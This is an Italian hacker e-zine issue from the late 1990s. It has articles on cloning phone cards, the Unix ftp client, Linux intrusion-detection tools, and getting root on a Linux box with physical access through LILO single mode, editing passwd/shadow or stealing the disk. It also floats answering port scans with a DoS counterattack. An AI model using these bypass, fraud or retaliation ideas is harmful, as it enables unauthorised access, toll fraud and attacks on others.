1 - se si copia la scheda nuova da 10.000 chiamata A in una scheda chiamata B
    e provando ad usare B x un importo di 1000 lire una volta terminata la
    telefonata provando ad inserire la tessera A noteremmo che l'importo non
    e' + 10.000 ma ben 9000 lire e cio' ci fa capire (o meglio dedurre) che
    se c'e' qualke tipo di codice sulla scheda ha poca importanza xche' cmq
    gli importi sono registrati in qualke bel server sperduto tra roma napoli
    e milano e quindi anke avendo 20 copie di una tessera l'importo da poter
    usare sarebbero sempre le solite 10.000 che abbiamo pagato (se l'avete
    rubata e' un'altro conto =).
2 - da un po' di tempo la telekom ha messo una ulteriore protezione moooolto
    batarda che vi andro' a spiegare Immaginate di avere copiato la carta A
    in una carta B. La carta A la avete voi che abitate a Bolzano mentre la
    carta B la regalate al vs amico phreaker che se ne torna a Siracusa.
    Ore 10:30 durante la vs pausa chiamate la vs tipa su cell con la vs scheda
    A e non succede nulla di strano. Alle 11 il vs amico chiama con la scheda
    B suo padre a casa x dire che e' arrivato e che lo aspetta in stazione.
    Anke qui nulla di strano. Voi alle 2 chiamate con la scheda A la vs
    amante ( =) ) e...che succede??? La carta e' disabilitata?????? cosa????
    Ed ecco il controllo che fanno alla telekoz...se la stessa scheda viene
    usata entro poche ore in due posti diversi la telekoz ha delle tabelle
    standard con degli orari anke xche' chi fa in mezz'ora da bolzano a
    siracusa ;) (forse Harlok da fumato hihihi).

ULTIMA NOTA = queste info dico che sono cose che mi sono state riferite da
              dipendenti interni telekom (e non novellini...) con cui mio
              malgrado (o perfortuna ;) dipende dai punti di vista) ho avuto
              a che fare. Detto cio' scusatemi se ho detto delle stronzate ma
              ho voluto solo mettere a conoscenza delle ultime cose da me
              sentite e cmq x verificare basta copiarsi una scheda (che non e'
              poi cosi' una strinzata) e spedirla ad un amico lontano e
              mettersi d'accordo x il gg e l'ora...
ULTIMO PS = un grande saluto \sPIRIT\ che spero mi stia scrivendo il driver in
            asm del lettore di schede magnetiche cosi' dopo ce divertimo!!!

                                                        N0bodY88
"Sfreccio nella notte,
 proiettuile carico di visioni di morte,
 razzo tracciante diretto al cuore del problema.
 E il cuore del problema sono io.
 Come sempre."
"Overminder - Il Sognatore" di Akira Mishima

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
     
                   ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                   ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                   ÷³          I COMANDI FTP         ³÷
                   ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                   ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

- Introduzione
Quando gli utenti internet non sapevano nemmeno cosa fosse l'HTML, quando
gopher sembrava una interfaccia rivoluzionaria per accedere ad informazioni,
ci si muoveva solo per mezzo di shell unix.
Posta elettronica e ftp erano all'ordine del giorno, e su questi (ma altri
servizi), Internet e' nata, cresciuta e sviluppata.
Perche' vi racconto questo? Dite che e' la scoperta dell'acqua calda?
Lo racconto proprio a quelli che si avvicinano a internet e cominciano a
scoprire programmi che danno loro servizi incredibili, alcune volte ritengono
che siano innovativi, idee geniali ... nello specifico mi riferisco (guarda
caso) ai client ftp.
Non ci vuole molta fantasia per capire che il file transfer protocol (ftp) e'
stato il servizio che ha maggiormente contribuito alla crescita di internet.
Anni di uso hanno sollevato problematiche che sono state risolte venendo
incontro a tutti i desideri degli utenti. Per questo motivo ci tengo a dire
che i vari client ftp esistenti non sono innovativi, incredibili ecc... ma
sono l'ennesima scoperta dell'acqua calda di tutto quello che esiste gia' da
anni.
Dopo questa mia piccola introduzione voglio passare a presentarvi il client
ftp piu' semplice, piu' comune, ma potentissimo e il padre di tutti gli altri
Mi riferisco al client ftp standard dei sistemi unix.
Ci si accede digitando semplicemente ftp da console.
Cerchero' di illuminarvi su buona parte di quello che potete fare da console.
Vedremo di partire dai comandi piu' banali, quelli che servono per fare un
download o upload, passando poi per il resume ftp, l'ftp 'incrociato' fra
server e concludendo sulle procedure di automatizzazione del tutto.
L'ultimo punto e' senza dubbio quello piu' interessante:avendo accesso ad una
shell unix di un server su linea dedicata, vi potrete curare di preparare uno
script per poi staccarvi e ritrovarvi al prossimo accesso con il risultato
del vostro ftp.
Ma procediamo con ordine.


- La connessione
Supponiamo che la vostra esigenza sia quella di scaricare un file dal sito
ftp.spippolatori.com, il primo comando da eseguire e' ovviamente ftp.
Digitato ftp otterrete il seguente prompt:
ftp>
il comando per aprire una connessione ftp e' open che si puo' abbreviare con
op, dopo aver dato il comando apparira' la richiesta da inserire l'indirizzo
del ftp server.
Quindi da
ftp>op
(si poteva fare anche ftp>open)
Si ottiene l'output
(to)
a quale dobbiamo dare il nome o l'ip del server ftp, nel nostro caso
ftp.spippolatori.com

Ottenuto il messaggio di welcome verra' richiesta l'utenza.
Se siete possessori di un accesso dedicato sul server userete quella, in caso
contrario l'utente da utilizzare sara' anonymous (sostituibile con ftp) e la
password una qualsiasi sequenza di caratteri il cui ultimo deve essere una @
o una qualcosa che sembri una email.

- Mostrare il contenuto
A questo punto la vostra necessita' sara' quella di conoscere il contenuto del
server ftp. Il comando e' il tradizionale ls di unix che nel caso delle opzioni
-la si puo' sostituire con dir.
Dir e' sicuramente comodo, ma se sul server fossero presenti directory fatte
da caratteri e spazi e' meglio ricorrere a ls -laF.
Il parametro F mette uno / alla fine di ogni directory.
Quindi la directory 'napo ' (non prendete in considerazione gli apici come
nome) con dir vi apparirebbe come 'napo', mentre con ls -laF come 'napo /'.
Qualora il contenuto non riesca a rimanere sullo
schermo e non abbiate un terminale dotato di scrollbar (il cacca telnet di
winbug) potete mandara l'output del vostro ls in un file in questo modo:

ftp>ls -laF * lista.txt

l'uso dell'asterisco e' il classico wildchart che sta per "tutto" (dir * =
mostra tutto) mentre lista.txt e' il file nel quale verra' scritto l'output.
Il client vi chiedera' se avete intenzione di creare il file (le risposte sono
il classico Y per si o N per no).


- Sospendere per andare alla shell
Per accedere al file potreste utilizzare i comandi sulle sospensioni dei job
come vi ha spiegato shark in questo numero di Newbie, oppure dare il comando
! (gia' puntoesclamativo); in questo modo accederete direttamente alla shell e
potrete leggere il file con un classico more lista.txt, per tornare alla
sessione ftp il comando sara' invece exit.

- Esempi fino a qui
es:

ftp ftp.spippolatori.com              [gia' si puo' accellerare senza dover
                                       ricorrere al comando op]
ftp> Name (ftp.spippolatori.com): ftp [avremmo potuto anche inserire
                                       anonymous]
ftp> Password (your email): napo@     [avremmo potuto anche inserire
                                       napo@writeme.com]
ftp>ls -laF * lista.txt
output to local-file: lista.txt? y    [rispodiamo si alla richiesta di
                                       creare il file]
                                                   
200 PORT command successful.                         
150 Opening ASCII mode data connection for /bin/ls.   
226 Listing completed.

ftp>!                                 [passo il comando ! e ...]

[/home/napo]$ more lista.txt          [... ottengo la shell unix di partenza
                                       alla quale passo il comando per vedere
                                       il contenuto del file lista.txt]

drwxr-xr-x  10 ftpadmin ftp-adm       1024 May 26 08:28 pub/
-rw-r--r--   1 ftpadmin ftp-adm          0 Nov 10  1998 Index.txt

[/home/napo]$ exit                     [e con exit torno ...]
ftp>                                   [... ad usare il client ftp]


- Entrare in una directory
Solitamente i server ftp anonymous (quelli nei quali si entra con l'utenza
anonymous) contengono i files scaricabili nella directory pub.
Per entrare in quella directory il comando e' cd

ftp> cd pub
200 PORT command successful
....
[dopo ogni comando, una volta aperta la connessione ftp si ottengono sempre
poche righe di informazione su cosa sta accadendo]

Se la directory contiene spazi allora si deve mettere il nome fra virgolette
es: cd "napo "
Se invece per caso vi perdete a forza di entrare ed uscire da sottodirectory
la vostra bussola e' il comando pwd che vi restituisce il path di dove siete
posizionati

- Binario o Ascii?
A questo punto si deve decidere il tipo di file che si vuole scaricare.
La scelta si divide su due possibilita': bin (per i file binari) e ascii (per
i file ascii che e' poi quella di default).
Scegliere il tipo binario per scaricare un file ascii non comporta nessun
problema (se non un download o upload leggermente piu' lento), sceglierlo
invece il tipo ascii per un file binario e' solo perdere tempo perche' il
vostro file non arrivera' in maniera corretta.


- Download e Upload + accorgimenti
Per prendere un file il comando e' get nomefile, qualora il nome sia lungo,
o abbiate intenzione di scaricare piu' di un file il comando e'
mget nomefile1, nomefile2, ..., nomefileN  (potete usare anche asterischi o
punti di domanda)

es:
ftp>bin
[ora vi salto il discorso dei messaggi di output]
ftp>mget *
[in questo modo scarico tutti i file contenuti nella directory]

Dato il comando mget *, vi verra' chiesta conferma per ogni file se volete
farne il download (per interrompere l'operazione basta premere CTRL-C) qualora
non vogliate dovere premere Y per tutti i file (potrebbero essere tantissimi)
il comando da dare prima del get e' prompt

es:
ftp>bin
ftp>prompt    [d'ora in poi non mi verranno fatte domande]
ftp>mget *

Se siete poi curiosi di avere idea della velocita' di come sta arrivando il
file allora dovrete ricorrere al comando hash (da dare, ovviamente, prima di
mget)

es:
ftp>bin
ftp>prompt
ftp>hash
ftp>mget *

Con hash otterrete un simbolo di # ogni 1024 byte scaricati

Il comando che vi permette invece di fare l'upload e' put nomefile (per uno) o
mput nomefile1,nomefile2, ... nomefileN (per N files)

- Resume FTP
Qualora abbiate la necessita' di interrompere il vostro upload o download e
vogliate riprendere in un secondo momento, vi avvallerete delle funzioni di
resume (attenzione: funziona solo se il server ftp lo supporta).
i comandi sono reget e reput (il primo per il download e il secondo per
l'upload).

- Directory locali e comandi remoti
Un "problema" classico di chi fa upload e' quello di andare a prendere i files
nella giusta directory. Per fare questo o siete partiti da quella directory o
vi avvalerete del comando lcd (local change directory) seguito dal nome della
directory. Se invece il caso fosse quello di dover creare una directory sul
server ftp il comando da eseguire sara' site 'md nomedirectory'.
Site in realta' serve per passare dei comandi da far eseguire sul server
remoto, avrete anche potuto fare cose folli come site 'chmod 777 nomefile'.
Ovviamente i sistemisti non sono tutti stupidi e questo comando non viene
abilitato a chi ha accesso anonimo, inoltre ricordo che su un server ftp
si rispecchia il sistema di permesso ai files o directory sullo stile classico
di unix (faccio riferimento a quei drwxr--r-- che si e' soliti vedere:
la prima lettera indica che si tratta di una directory, il resto va letto poi
in terzine, dove r sta per permesso di lettura, w permesso di scrittura, x
permesso di eseguire e le terzine per utente padrone del file, gruppo a cui
appartiene l'utente, tutti gli utenti) e quindi non potrete mai eseguire
nulla senza i giusti permessi.


- Ftp incrociato
Spesso capita che si abbia la necessita' di trasferire i file da un server
ad un altro passando dalla propria shell.
Onde evitare il passaggio server 1 -> server dove ho la shell -> server 2 si
usa il comando proxy.
Una volta connessi ad un server ftp con la procedura vista sopra si apre una
nuova connessione nel seguente modo: proxy op NomeServeraCuiConnettersi.
Ovviamente seguiranno ancora le richieste di rito quale utenza e password, da
li' in poi si daranno i comandi al server "proxato" (ossia quello aperto con
la seconda connessione) anticipandoli con il comando proxy (tranne pero' nei
casi dei comandi: bin, ascii, hash e prompt).
Ora vi faccio un esempio pratico:

[/home/napo]$ ftp ftp.spippolatori.com

[do tutte le mie informazioni riguardo user e password]

ftp>proxy op ftp.napo.org

[e qui ancora tutte le informazioni di user e password]

ftp>cd "nuovi articoli"
ftp>ascii
ftp>prompt
ftp>proxy cd "articoli in lavorazione"
ftp>proxy mput *
[in questo modo passo tutti i file dal server ftp.napo.org contenuti nella
directory "articoli in lavorazione" al server ftp.spippolatori.com nella
"nuovi articoli" senza che la shell che sto usando parcheggi files.

- Chiudere la sessione
Finiti tutte le operazioni ftp usciamo salutando: bye e dato questo comando
siamo tornati alla nostra shell

- Automatizzare
La procedura di immettere tutte le volte user e password quando ci si connette
diventa barbosa quando si e' soliti andare negli stessi siti.
Per fare in modo che sia tutto automatizzato si deve creare un file dal nome
.netrc
il file va costruito secondo il seguente schema:
machine   NomeMacchinaFtp
login     UtenzaSulServer
password  PasswordUsata

Detto in altri termini

machine   ftp.napo.org
login     napo
password  TeLoScordiCheTeLaDiaAnchePerche'NonHoUtenzaSuQuelSitoChePero'Esiste

dovrete pero' dare gli attributi di 755 al file (chmod 755 .netrc)
D'ora in poi ogni volta che aprirete una connessione ftp, il client leggera'
il vostro .netrc e, se trova il server ftp nell'elenco, pensera' lui a passare
user e password

Per quello che riguarda le operazioni che andrete a fare per la vostra sessione
ftp, il sistema da usare e' quello di creare un file ascii con un nome a
piacere nel quale inserire i comandi che andrete ad eseguire uno alla volta
(ovviamente dovete gia' conoscere la struttura dal sito).
Una volta che avrete fatto questa operazione dovrete passare il file comandi
al client ftp nel modo classico di unix.
Quindi:
ftp ftp.spippolatori.com < comandi.txt

qualora comandi.txt sia un file contente i comandi:
 cd "nuovi articoli"
 ascii
 prompt
 proxy op ftp.napo.org
 proxy cd "articoli in lavorazione"
 proxy mput *
 bye

- Eseguire un ftp senza dover essere presenti durante il downalod
Una volta creato il vostro .netrc e il vostro file contenente i comandi da
eseguire potete decidere di staccarvi e lasciare che il download avvenga per
i fatti suoi, ma serve fare alcuni accorgimenti.
Le strade da seguire sono: nohup, at, screen (ma si possono seguire altre vie)

nohup
nohup e' un programma che sta per no hung up (non staccare), non e' un comando
ftp e va eseguito prima di fare l'ftp
quindi
[/home/napo]$ nohup
[/home/napo]$ ftp ftp.napo.org < comandi.txt
[/home/napo]$ logout

at
at e' un programma che vi permette di eseguire qualcosa in un determinato
orario (si puo' usare anche un crontab)
si da il comando at seguito dalla data, o dall'ora in cui si vuole parta il
processo, a quel punto si "entra" in una sorta di modalita' di editing nella
quale inserire i comandi riga per riga e uscire con CTRL-D
esempio:
[/home/napo]$ at 01.00
ftp ftp.napo.org < comandi.txt

[do l'OK premendo CTRL-D]

screen
screen e' uno splendido programma che permette di gestire un sola sessione di
shell come se fossero infinite.
una volta digitato screen si possono creare nuove sessioni attraverso CTRL-A
(A sta per ADD). Per passare da una sessione all'altra si usa CTRL-N (N= next)
Per uccidere una sessione CTRL-K (K = kill). E per staccarsi (ma lasciando i
vivi i proccessi) CTRL-D (D = detach).
Al successivo rientro nella shell si possono recuperare tutti processi con il
comando
screen -r
Ovviamente screen lo si puo' usare per altre molte cose ...

Conclusioni
Non ho un cavolo di voglia di rileggere il tutto. Avevo promesso a N0bodY88
che avrei scritto un articolo sul client ftp di unix (magari nei prossimi
numeri vi parlo di come installare qualche ftp server per linux). Avevo detto
che lo avrei consegnato a mezzanotte e' invece e' l'una :( (domani sveglia
alle 6). Ringrazio questa emittente televisiva privata che mi ha fatto
compagnia sulla mia scheda tv con il "documentario" 'Topless a Chicago', a
base di super tette di donne degli anni 70 (minchia ... certe gnocche!
peccato che ora le signorine ora avranno piu' 50 anni) ... tornando agli ftp
vi nomino un paio di client ftp a testo per linux molto potenti:
ncftp
lftp
linfXp
e vi saluto con il mio solito motto
"Che Figa e Vittoria non manchino MAI!!!"               Napo Orso Capo
                                                        (www.napo.org)

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
    _     _______  ________  __   _  ______  _   _   _    ____   ________
   / \   |_____  | |  ___  | \ \ | ||____  || | | | | |  |__  |  |  ___  |
  / _ \    _   | | | |   | |  \ \| |     | || | | | | |     | |  | |   | |
 / ___ \  | |  | | | |___| | __\ ` |     | || |/ /_/ /  ____| |  | |___| |
/_/   \_\ |_|  |_| |_______||______|     |_||_______/  /____/\_\ |_______|

Titolo: ----------Ottenere il root senza digitar password alcuna-----------
Sottotitolo:------Potendo toccare la tastiera!-----------------------------

Inizialmente linux fu pensato esclusivamente come potente server web cosi' fu 
trascurata la parte relativa alla sicurezza fisica della macchina (al contra
rio di quella virtuale) e avvertirono tutti i SystemOperator di chiudere bene
la porta a chiave in quanto avevano introdotto una simpatica funzione per tut
ti qui So distratti che dimenticavano la loro Pass, infatti per poter entare 
nel sistema coi privilegi root bastava e basta scrivere al Lilo pippo single
,dove pippo e' il comando per avviare la patizione linux (solitamente Linux,
quindi Al Lilo: linux single).
Questo vi dara' accesso ad una shell piuttosto ristretta con ben pochi comandi
tra i quali anche passwd che vi permettera' di cambiare la pass di root o edita
re il passwd o shadow quindi riavviate con le nuove impostazioni e la nuova
pass quindi... fate voi.
Al giorno in cui scrivo questa simpatica opzione e' implementata in tutte le
distribuzioni tranne SuSE e Debian (Io l'ho provato di persona su RedHat 5.2,
Mandrake 5.3 e slackware 3.0 con esiti "positivi" e con SuSE 6.0 & 6.2 con
esiti negativi)
Se la distribuzione non implementa la funzione avete ben tre altre
possibilita':

1- Montare un MiniLinux come root ed editare i file passwd o shadow
2-Se sulla macchina e' montato anche win9x installate uno di quei bei prog per
leggere le partizioni Ext2 che se ne fregano altamente di permessi vari ed
editare i file passwd o shadow
3-Armatevi di piede di porco sfasciare il case e andare allegramente a casa
con un hard Disk in piu'

Ho finito per commenti vari scrivere a avogrado@freemail.it

                                                        Avogrado  

Enjoied

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                ÷³   ALCUNE UTILITY INDISPENSABILI   ³÷
                ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Premessa

Una premessa essenziale. Chi sono io? Io sono solo una persona, che
crede nella esplorazione intellettuale a ruota libera delle piu' alte
e profonde potenzialita' dei sistemi di computer, le persone come me
non si classificano in nessun termine appropriato, il nostro fine e'
la pura e sola conoscenza. Io non ho nulla contro societa che pur di
fare soldi disprezzano la sicurezza informatica, ma penso che la mia
privacy e la mia sicurezza informatica siano importanti, percui
preferisco a sistemi operativi commerciali, sistemi operativi Open
Source semplicemente perche' posso controllarne e verificarne i
problemi di persona.
-----------------------------------------------------------------------------
Nmap e Sicurezza.

Avete mai provato nmap? Bene, se si saprete di cosa si tratta,
altrimenti ve lo spiego io. Per chi non lo sapesse nmap
(www.insecure.org/nmap) e' penso un eccellente portscanner con la
possibilita di rilevamento del sistema operativo, creato da Fyodor (un
vero hacker!). Rilevare un sistema operativo su una macchina remota e'
importante in quanto tutti i servizi exploitabili sono macchina
dipendenti. Per esempio due settimane fa su BUGTRAQ e' apparso un
avviso su un fatale bug del telnet di Red Hat Linux 6.0, supponendo
che la nostra macchina remota abbia un accesso telnet, e sapendo la
versione del kernel di Linux (lo standard per la rh 6.0, e' 2.2.5,
n.b. consiglio a tutti di upgradarlo), un possibile cracker potrebbe
crearsi un programmino che sfrutti questo bug e penetrare nel sistema,
ottenendo il fatidico accesso root (nota: questo e' il classico
comportamento da Script Kiddie, nessuno rimmarra impressionate della
vostra abilita', semplicemente avete dimostrato che sapete lanciare un
programma). Come prevenire cio? Esistono diversi metodi e molte utility
interessanti che fanno al nostro caso,la maggior parte di queste gratuite
e aventi come sistema operativo di riferimento Linux.  Una nota per gli
utenti Windows, lo so che magari siete pigri, ma se potete quando siete in
rete usate un sistema piu' sicuro, anche solo per chattare, io non ho
nulla contro M$, ma trascurare la sicurezza per la semplicita' d'uso non
e' in generale una buona cosa. In questo articolo risponderemo alla
seguente domanda:
come rendere piu' sicura una macchina stand-alone in Intenet,
rilevando tutti gli attacchi e stoppandoli sul nascere.  
Una buona utility che mi e' piaciuta tanto e' JAIL (Just Another Ip
Logger), permette di rilevare anche il piu stupido ping sul tuo IP, si
compone in due parti : icmplog e tcplog. Il primo consente di rivelare
l'indirizzo di un qualsiasi ping o pacchetto che utilizzi il
protocollo ICMP, il secondo per le richieste di connessione. Se nel
file /var/log/messages vedete connessioni non richieste da voi,
significa che qualcuno quantomeno ha tentato di usare un portscanner
su di voi. Per esempio, questo stupido lamer , mi ha fatto lo scan due
volte alla ricerca di un NetBus (12345 - e' la porta standard NetBus),
quando stavo su IRC:

- la prima volta .

Sep 1 17:05:06 Cindy tcplog: port 20034 request from
rm1-1084.tiscalinet.it Sep 1 17:05:07 Cindy tcplog: port 12345 request
from rm1-1084.tiscalinet.it Sep 1 17:05:48 Cindy tcplog: port 12345
request from rm1-1084.tiscalinet.it Sep 1 17:05:51 Cindy last message
repeated 3 times

- la seconda volta.

Sep 1 17:09:34 Cindy tcplog: port 20034 request from
rm1-1084.tiscalinet.it Sep 1 17:09:34 Cindy tcplog: port 12345 request
from rm1-1084.tiscalinet.it Sep 1 17:09:35 Cindy tcplog: port 12345
request from rm1-1084.tiscalinet.it Sep 1 17:09:35 Cindy tcplog: port
20034 request from rm1-1084.tiscalinet.it Sep 1 17:09:36 Cindy tcplog:
port 12345 request from rm1-1084.tiscalinet.it Sep 1 17:09:36 Cindy
tcplog: port 20034 request from rm1-1084.tiscalinet.it Sep 1 17:09:37
Cindy tcplog: port 12345 request from rm1-1084.tiscalinet.it Sep 1
17:09:37 Cindy tcplog: port 20034 request from rm1-1084.tiscalinet.it

L'esempio sopra descritto illustra l'utilizzo di tcplog, che registra
le porte tcp, ma l'icmplog ti puo dire in alcuni casi se il soggetto
e' spoofato o meno.  Semplicemente facendo il ping su di esso, inoltre
ti avvisa nel caso qualcuno ti abbia fatto il ping , vediamo i due
casi:

- questo e' un indirizzo spoofato:

Sep 3 18:03:45 Cindy icmplog: destination unreachable from
ns1.cindy.com

Nota: avevo fatto il ping su un indirizzo , che mi pareva strano ....

- questo e' il ping fatto su di me:

Sep 3 18:40:32 Cindy icmplog: echo from dadovago028.dada.it

Ora questi e' un utility utile, ma come fermare un portscan ?

Bene un'altra utility, che fa parte del progetto Abacus di Craig
Rowland ci puo tornare utile, PortSentry (www.psionic.com), anche se
ha qualche problemino, infatti e' possibile mandarla in Denial of
Service, se lo scan parte dallo stesso route dell'utente, ma
generalmente non e' possibile per l'utente che fa lo scan vedere se
PortSentry sia attivo o meno. PortSentry blocca lo scan con l'utility
ipchains e aggiunge l'indirizzo IP del cracker al file
/etc/hosts.deny, inoltre e' possibile far comparire un messaggio al
cracker se e' impostata la modalita' normale, oltre a che mandare una
mail all'utente root impostando in maniera adeguate il suo file di
configurazione. Ovviamente premessa essenziale per la sicurezza e'
avere solo i servizi indispensabili. Se non avete una rete, portmap
non vi serve, cosi come non vi servono i servizi vari tipo finger,
telnet, ftp, http. Consiglio percio' di disabilitarle nel file
/etc/inetd.conf tutto il "surplus". Esistono altri programmi, che
possono esserci utili? La risposta e' si, ma sono complementari a
portsentry, nel senso che possono coesistere con questo, altri semplici
sistemi di rilevemento delle intrusioni, come per esempio Snort, di
cui ho appreso l'esistenza grazie a CyberPsychotic. Ecco come lo
descrive:"Usando le regole di configurazioni di Snort poi specificare
su quale tipo di traffico di rete, vuoi che il tuo sistema faccia
attenzione, specificando sorgente del pacchetto, porta sorgente, porta
destinazione.. ". Proprio cosi', ha funzionalita' simili a quelle di
JAIL, ma la sua alta configurabilita' consente di rilevare, a che tipo
di attacco si e' sottoposti, e cercare di porre rimedio, per esempio
stoppando il servizio o filtrando tramite ipchains i pacchetti
provenienti da quell'indirizzo o andando a rintracciare l'aggressore e
facendogliela pagare. Un programma utilissimo e' sicuramente Tripware
(http:///www.tripewaresecurity.com), anche se e' un programma
commerciale, e i sorgenti non sono disponibili, ma i binari sono
free. Tripware consente di configurare in maniera adeguata, i file
importanti della vostra linux box, e vi manda una mail se un qualsiasi
utente (anche root) tenti di modificare uno di quei file configurati
con Tripwire, questo vi permette di rilevare, oltre che a eventuale
hack della vostra box, la presenza di worm, o un trojan.. uhm davvero
utile!  Unico neo di quest'ultimo programma e che i binari ( della
versione 2.0) non funzionano a modo con la rh 6.0, bisogna ottenere i
sorgenti di una versione precedente dalla Suse (ftp.suse.com) e vedere di
compilarli per le glibc. 
-----------------
Conclusioni.
I programmi da me descritti, possono essere utilissimi a rilevare un
attacco  di una qualsiasi natura, ma cmq e' meglio non fidarsi mai..  e
magari mettere delle regole dial-up per ipchains: una specie di firewall,  
che nega tutti i servizi che a voi non servono,  magari un facendo uno
script bash. Comunque ne riparleremo... per ora incominciate a capire il
funzionamento delle utility da me descritte.  Per quanto riguarda il
pseudo-fire, l'idea che in questi giorni mi gira in testa e'  di usare
ipchains per inoltrare i servizi essenziali in uscita (http, smtp, nntp,
ftp)  e negare ogni connessione, loggandola, cmq ne riparleremo.
Un altra cosa simpatica sarebbe modificare PortSentry  al fine di fare una
attacco Targa contro l'attaccante,  anche se ci possono essere dei
problemi che possono condurre ad un DoS. Uhm, per chi non lo sapesse un
attacco targa consiste di 5 attacchi Denial of Service :  SYNFlood,
Teardrop, Land, LaTierra, PingOfDeath. Troverete ogni riferimento su
questi attacchi su www.rootshell.com o  dopo il 15 settembre sul nuovo
sito di PacketStorm : www.securify.com/packetstorm.  Io vi saluto.. e vi
auguro buona notte... uhm, sono le 4 ... Ciauz!         
Riferimenti.
----------------------
[1] Keen Veracity 8 - www.legions.org
[2] Daemon News Sept 99- www.daemonnews.com
[3] Rootshell - www.rootshell.com
[4] PacketStorm - www.securify.com/packetstorm
[5] Phrack - www.phrack.com

							Zippy2k

-----------------------------------------------------------------------
From a sign seen (da una signiture vista)
-----------------------------------------------------------------------
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
.clarkm2@nevada.edu
"one world, one web , one program"
--- Micro$oft Adv.
"ein volk, ein reich, ein fuhrer" 
--- Adolf Hitler.
Tradotto:
"un mondo, un web , un programma" 
--- Pubblicita' Micro$oft
"un popolo, un regno, un capo"
--- Adolf Hitler.
P.S. Quale e' la differenza?
-----------------------------------------------------------------------
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                        ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                        ÷ִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                        ÷³  COME FUNZIA L'HPING  ³÷
                        ÷ְִִִִִִִִִִִִִִִִִִִִִִִ÷
                        ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

					HanguPinG !!!!!!

Domenika pomeriggio: Il Dantazzo mi fa... 
<DanteAlig> Hai fatto un articolo per NB???
<Dark_Elf> Perke' avrei dovuto?
<DanteAlig> GRRRRRRRRRRRRRRRRRRRRRRRR
e sikkome io ho una paura folle del Dantazzo inkazzato [mi mena kon
l'originale manoskritto dell'eneide... il peso della kultura]

**Nota by Dantinkulo**

Perche' proprio l'Eneide ? non m'avrai mika confuso con quel tira
seghe di Virgilio ???

gli diko: MA KAZZO NON HO IDEE su kosa lo faccio sull'hping?
e lui non so manko kosa sia.. scrivi, scrivi.
Ora: Ho realizzato 2 cose
1: Il Dantazzo non conosce l'HANGUP PING
2: Il Dantazzo e' un grande KAKAKAZZO ;))))))))
una tonnellata di saluti:
--------------------------GREETZ----------------------------------------
A tutta #CACCA e #CHIETI e a quello ke rimane di #HACKERNOW

in particolare a tutte le bellissime del mio modem
[in ordine alfabetico kosi' non vi inkazzate]

Adryana :***********************************************************
        [TAAAAAAAAAAAAAAAAANTI BACIOTTOLI Come faccio senza di te? ]
OnyXGirl :* [uno solo ke il _p0mici0_ si inkazza :)
Polly :************* [un po di + perke' anke se il Dantazzo si 
                      inkazza non me ne frega nulla ;))))))))]

*Altra nota by Dantikulo*

GRRRRRRRRRRRRRRRrrrrrrrr.......sti bacetti non li gradisco :PPPpp


Sharra14 :*** [3 perke' tra un po kompie gli anni ma non di + ke mi si 
              inkazza la Tanith :***********************************]
Tanith :*************************************************************
       **************************************************************
       [ce ne vorrebbero di + ma poi il dante mi fa mastikare le 
       pelotas da un coniglio rabbioso se gli occupo ankora byte 
       per un'artikolo kome questo SSSSSSSSMUAUAAAAAAAAAAAAACKK]

E un bel po di Greetz a Dante Alighieri DeViLNeT Cicc3tt0nE |-DkK-| jesty2
